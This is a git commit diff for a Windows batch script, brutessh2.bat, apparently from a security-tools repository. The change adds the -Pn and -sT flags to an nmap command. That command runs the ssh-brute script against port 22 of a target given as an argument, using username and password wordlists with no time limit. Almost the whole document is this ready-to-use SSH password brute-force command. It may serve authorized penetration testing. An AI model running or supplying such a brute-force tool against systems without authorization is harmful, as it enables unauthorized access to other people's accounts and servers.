b7ba76985428a9bab676edc2c8b44a1203a15365
hackingyseguridad <antonio_taboada@hotmail.es>
2022-07-13 10:24:14 +0200

    Update brutessh2.bat

--- brutessh2.bat
+++ brutessh2.bat
@@ -1,3 +1,3 @@
 @echo off
 echo " "
-nmap %1 -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0
+nmap %1 -Pn -sT -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0
